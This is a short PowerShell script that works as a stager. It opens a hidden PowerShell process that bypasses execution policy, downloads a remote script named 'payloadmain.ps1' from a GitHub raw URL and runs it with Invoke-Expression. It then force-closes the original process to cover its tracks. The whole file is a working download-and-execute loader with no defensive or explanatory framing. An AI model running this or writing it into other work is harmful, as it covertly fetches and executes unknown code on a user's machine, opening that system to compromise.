# Save the current PowerShell process ID
$parentProcessId = $pid

# Start a new PowerShell process
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EffortPeaked/gsdttsada/main/payloadmain.ps1');`"" -PassThru -WindowStyle Hidden

# Close the old PowerShell instance
Stop-Process -Id $parentProcessId -Force
